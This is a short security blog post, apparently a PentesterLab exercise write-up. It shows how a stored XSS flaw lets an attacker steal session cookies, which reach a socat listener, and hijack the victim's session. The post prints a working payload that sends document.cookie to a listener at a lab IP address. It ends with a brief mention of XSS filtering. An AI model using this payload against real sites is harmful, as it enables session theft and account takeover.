<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>Hijacking sessions using socat – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="socat, XSS, Web Application, netcat, OWASP, pentesterlabs, session hijacking, Penetration Testing, cookie manager"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="Hijacking sessions using socat"> <meta name="twitter:description" content="Recently I’ve been working through pentesterlabs exercises to learn a bit more about identifying and exploiting security flaws in web applications."> <meta name="twitter:site" content="@hackerjiv"> <meta name="twitter:creator" content="@hackerjiv"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="Hijacking sessions using socat"> <meta property="og:description" content="Recently I’ve been working through pentesterlabs exercises to learn a bit more about identifying and exploiting security flaws in web applications."> <meta property="og:url" content="http://localhost:4000/hijacking-sessions-using-socat/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/hijacking-sessions-using-socat/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> <!-- Begin Jekyll SEO tag v2.2.3 --> <title>Hijacking sessions using socat | popped.io</title> <meta property="og:title" content="Hijacking sessions using socat"> <meta name="author" content="Sanjiv Kawa"> <meta property="og:locale" content="en_US"> <meta name="description" content="Recently I’ve been working through pentesterlabs exercises to learn a bit more about identifying and exploiting security flaws in web applications."> <meta property="og:description" content="Recently I’ve been working through pentesterlabs exercises to learn a bit more about identifying and exploiting security flaws in web applications."> <link rel="canonical" href="http://localhost:4000/hijacking-sessions-using-socat/"> <meta property="og:url" content="http://localhost:4000/hijacking-sessions-using-socat/"> <meta property="og:site_name" content="popped.io"> <meta property="og:type" content="article"> <meta property="article:published_time" content="2014-02-11T12:23:00-05:00"> <meta name="twitter:card" content="summary"> <meta name="twitter:site" content="@"> <meta name="twitter:creator" content="@Sanjiv Kawa"> <script type="application/ld+json"> {"@context":"http://schema.org","@type":"BlogPosting","headline":"Hijacking sessions using socat","author":{"@type":"Person","name":"Sanjiv Kawa"},"datePublished":"2014-02-11T12:23:00-05:00","dateModified":"2014-02-11T12:23:00-05:00","description":"Recently I’ve been working through pentesterlabs exercises to learn a bit more about identifying and exploiting security flaws in web applications.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/me.png"},"name":"Sanjiv Kawa"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hijacking-sessions-using-socat/"},"url":"http://localhost:4000/hijacking-sessions-using-socat/"}</script> <!-- End Jekyll SEO tag --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="mailto:sanjiv@popped.io" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-envelope-square"></i> Email</a> </li> <li> <a href="http://twitter.com/hackerjiv" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>Hijacking sessions using socat</h1> <h4>11 Feb 2014</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~2 minutes </p>
<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <p>Recently I’ve been working through pentesterlabs <a href="https://pentesterlab.com/exercises/">exercises</a> to learn a bit more about identifying and exploiting security flaws in web applications.</p> <p>During one of the labs I came across an awesome tool called <a href="http://freecode.com/projects/socat">socat</a> this tool has the ability to listen to multiple connections and act as a TCP relay port. Netcat does have similar functionality, however it will stop after the first connection, whereas socat will keep forking.</p> <p>socat can be configured to echo HTTP GET requests, this is particularly useful if we want to view session cookies in the HTTP GET header.</p> <p>Lets say we wanted to steal a session cookie from a victim, possibly even the administrator of a web page. A fairly common way to do this is to find a persistent XSS flaw in the web app. This is what we could do:</p> <p>First locate the XSS flaw, then drop the following Script tag which write an Image tag to the web page.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="o">&lt;</span><span class="nt">script</span><span class="o">&gt;</span><span class="nt">document</span><span class="nc">.write</span><span class="o">(</span><span class="s2">'&lt;img src="http://192.168.117.129/?'</span><span class="o">+</span><span class="nt">document</span><span class="nc">.cookie</span><span class="o">+</span><span class="s2">'"/&gt;'</span><span class="o">);&lt;/</span><span class="nt">script</span><span class="o">&gt;</span></code></pre></figure> <p>When a victim visits the web page, the image tag will be loaded. The image tags URL grabs the victims cookie and as a result, it will be sent to the malicious server located at .129.</p> <p>In the mean time on .129 we have an instance of socat running listening on port 80 for HTTP GET requests.</p> <figure> <center> <img src="https://4.bp.blogspot.com/-SR5TcGxQHJQ/UvpUmE6nKuI/AAAAAAAABho/Q-s-dDRqSXo/s1600/3.PNG"> </center> </figure> <p>The victims Session ID <code class="highlighter-rouge">qsp5uk0n9m6ctf568e928u5jc2</code> was passed along, and from here we can easily hijack their session using something like cookie manager:</p> <figure> <center> <img src="https://4.bp.blogspot.com/-zQZvV3Bwlw8/UvpVfFjc-8I/AAAAAAAABhw/l773AWWvHcg/s1600/4.PNG"> </center> </figure> <p>So, what can be done to <a href="http://tinyurl.com/bmmwzf">mitigate</a> this? Without getting overly technical good start would be to use secure/safe coding practices and implementing adequate XSS filters.</p> <p>Ultimately, using Image tags to grab Session ID’s isn’t exactly new, in fact, most modern web pages have decent XSS filters in place to prevent users sessions from getting hijacked. The whole point of this was just to show you how cool socat is and what could happen if there is an XSS vulnerability on your web site.</p> <div class="entry-meta">  <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#socat" title="Pages tagged socat" class="tag"><span class="term">socat</span></a><a href="http://localhost:4000/tags/#XSS" title="Pages tagged XSS" class="tag"><span class="term">XSS</span></a><a href="http://localhost:4000/tags/#Web%20Application" title="Pages tagged Web Application" class="tag"><span class="term">Web Application</span></a><a href="http://localhost:4000/tags/#netcat" title="Pages tagged netcat" class="tag"><span class="term">netcat</span></a><a href="http://localhost:4000/tags/#OWASP" title="Pages tagged OWASP" class="tag"><span class="term">OWASP</span></a><a href="http://localhost:4000/tags/#pentesterlabs" title="Pages tagged pentesterlabs" class="tag"><span class="term">pentesterlabs</span></a><a href="http://localhost:4000/tags/#session%20hijacking" title="Pages tagged session hijacking" class="tag"><span class="term">session hijacking</span></a><a href="http://localhost:4000/tags/#Penetration%20Testing" title="Pages tagged Penetration Testing" class="tag"><span class="term">Penetration Testing</span></a><a href="http://localhost:4000/tags/#cookie%20manager" title="Pages tagged cookie manager" class="tag"><span class="term">cookie manager</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/hijacking-sessions-using-socat/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/hijacking-sessions-using-socat/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/hijacking-sessions-using-socat/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>  </body>
</html>
